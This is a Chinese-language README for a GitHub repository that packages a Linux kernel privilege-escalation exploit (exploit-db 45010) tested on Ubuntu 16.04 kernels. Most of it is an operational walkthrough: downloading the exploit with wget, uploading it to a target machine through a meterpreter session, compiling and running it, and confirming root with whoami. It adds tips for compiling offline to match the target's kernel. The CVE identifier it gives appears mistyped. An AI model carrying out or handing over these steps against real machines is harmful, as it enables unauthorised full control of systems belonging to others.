# Privilege-Escalation

## 支持内核列表

- CVE-2017-16695

在以下内核的 Ubuntu 16.04 测试通过：

    4.4.0-31-generic
    4.4.0-62-generic
    4.4.0-81-generic
    4.4.0-116-generic
    4.8.0.0-58-generic
    4.10.0.42-generic
    4.13.0-21-generic

## 使用方法

下面直接演示使用方法:

下载 `45010.c`:
```
wget https://github.com/Jewel591/Privilege-Escalation/blob/master/45010.c
```
    

先检查目标机上是否安装 gcc：

    vir@ubuntu:~$ gcc
    gcc: fatal error: no input files
    compilation terminated.

如果有安装 gcc ，直接上传 45010.c 到目标机器上进行编译(使用 meterpreter 或者其他的方法)：

    meterpreter > upload /home/vir/45010.c /tmp/45010.c
    # 下面进行编译
    gcc 45010.c -o 45010
    # 添加执行权限
    chmod +x 45010
    ./45010
    # 成功提权到 root。
    whoami
    root

![](https://i.loli.net/2020/04/17/sQuxqvOb8GyBNR9.png)

如果目标机没有 gcc 环境，可以在本地进行编译之后上传——尽量使用和目标机发行版本、内核版本完全一致的虚拟机中编译。

## References/Resources

[https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html](https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html)

[https://www.exploit-db.com/exploits/45010](https://www.exploit-db.com/exploits/45010)
